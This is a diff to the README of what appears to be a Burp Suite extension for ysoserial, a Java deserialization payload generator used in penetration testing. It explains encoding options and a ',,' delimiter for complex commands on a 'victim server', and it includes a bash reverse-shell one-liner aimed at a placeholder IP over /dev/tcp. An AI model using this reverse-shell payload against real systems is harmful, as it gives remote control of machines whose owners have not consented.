@@ -3,8 +3,8 @@
 
 There are 3 ways to run this extension. 
 
- 1. Generate a payload from the menu above. You can then copy and paste it into other tabs in burp.
- 1. Generate a payload from the menu above. In another tab you can select the text you want to replace and right click. You have 3 options to replace.
+ 1. Generate a payload from the YSOSERIAL Tab. You can then copy and paste it into other tabs in burp.(Not ideal)
+ 1. Generate a payload from the YSOSERIAL Tab. In another tab you can select the text you want to replace and right click. You have 3 options to replace.
    1. Raw - This will replace your selected text with an unencoded version of the payload. This is raw binary/hex.
    1. B64 - This payload will replace your selected text with a base64 encoded version.
    1. URLEnc - This will replace your selected text with a URL encoded and base64 encoded payload. Ideal for web type applications
@@ -22,13 +22,13 @@ There are 3 ways to run this extension.
  The second parameter is obviously the OS command you wish to run.
  
 ## Complex Commands (i.e. pipes and I/O redirection)
-Note ysoserial in this extension has been updated to accept more complicated commands that in the original. For instance commands the following command would fail to execute on the victim server:
+Note ysoserial in this extension has been updated to accept more complicated commands that in the original. For instance commands like the following command would fail to execute on the victim server in the original ysoserial application.
  
 ```echo test > /tmp/text.txt```
   or
 ```bash -c "echo test > /tmp/text.txt"```
  
-This is because to run complex commands that pipe command into other commands in java the arguments needs to be a string Array. This version of ysoserial has been modifiedby using a delimter of ",,". to seperate your arguments to the string array.  Here is an example of running a more complicated command using this method to get a reverse shell: 
+This is because to run complex commands that pipe command into other commands in java the arguments needs to be a string Array. This version of ysoserial has been modified by using a delimter of ",," to seperate your arguments to the string array.  Here is an example of running a more complicated command using this method to get a reverse shell: 
   
  ```/bin/bash,,-c,,bash -i >& /dev/tcp/X.X.X.X/9997 0>&1```
  
